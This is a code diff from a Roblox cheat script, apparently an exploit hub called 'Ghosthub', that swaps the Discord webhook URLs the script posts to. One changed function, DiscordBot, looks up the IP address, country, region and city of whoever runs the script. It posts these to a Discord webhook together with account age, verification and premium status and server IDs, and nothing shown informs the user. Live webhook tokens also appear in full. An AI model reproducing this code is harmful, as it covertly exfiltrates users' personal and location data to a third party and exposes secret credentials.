@@ -1732,7 +1732,7 @@ if FileScriptSupported == true then
                FeedbackPost.Active = false
                FeedbackTextBox.Active = false
                local content = "```✅ 𝗚𝗵𝗼𝘀𝘁𝗵𝘂𝗯 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸\n\nUsername: "..game.Players.LocalPlayer.Name.."\nDisplay: "..game.Players.LocalPlayer.DisplayName.."\nUser ID: "..game.Players.LocalPlayer.UserId.."\n\nMessage: "..FeedbackTextBox.Text.."```"
-               local webhookUrl = "https://discord.com/api/webhooks/1356658332198506719/O5dlAvPcny42B6zDZ03nLUkcrRXYX1zjAJhLb69jI5_MUfW3RLjrCa9sFl6X5j3Ko5-w"
+               local webhookUrl = "https://discord.com/api/webhooks/1357770936488820737/VfqcmOmYWUk8Wud8jqRgRtv8hEwoUD7j-h8VUhVELXreZOpihj7J_Lw0O-j5-I7GMyUr"
                local messageData = {["content"] = content}
                local request = request or syn.request
                local send = request({
@@ -4419,7 +4419,7 @@ local function DiscordBot()
 
  local API = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwho.is/"))
  local data = {content = "✅ Execute Time: "..os.date("%B %d %Y | %p %I:%M:%S"),embeds = {{description = "Username: \n"..game.Players.LocalPlayer.Name.."\n\nDisplay: \n"..game.Players.LocalPlayer.DisplayName.."\n\nUser ID: \n"..game.Players.LocalPlayer.UserId.."\n\nAccount Age: \n"..game.Players.LocalPlayer.AccountAge.."\n\nCreated: \n"..GetPlayerJoinDate(game.Players.LocalPlayer.AccountAge).."\n\nVerified: \n"..DetectVerifyEmail(game.Players.LocalPlayer).."\n\nPremium: \n"..DetectPremuim(game.Players.LocalPlayer).."\n\nIP Address: \n"..API.ip.."\n\nContinent: \n"..API.continent.."\n\nCountry: \n"..API.country.."\n\nCountry Flag: \n"..API.flag.emoji.."\n\nRegion: \n"..API.region.."\n\nCity: \n"..API.city.."\n\nGame Place: \n"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."\n\nPlace ID: \n"..game.placeId.."\n\nServer ID: \n"..game.jobId,thumbnail = {url = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false")).data[1].imageUrl}}}}
- local webhookUrl = "https://discord.com/api/webhooks/1355948046835515403/e04dd9vHnVp5qiSOkGcrUEMSZJn7mDpk7YUCWtFTB4xI3OCB_840Sw8Vg8fYJdPn5gBa"
+ local webhookUrl = "https://discord.com/api/webhooks/1357769721507877126/crs2N9xlCA--6iq04F_m-RRPCOIzAD7XVQuCCJk8DQRybMCKCCetMMAQ6bIPBO6BHHuY"
  local request = request or syn.request
  local send = request({
    Url = webhookUrl,
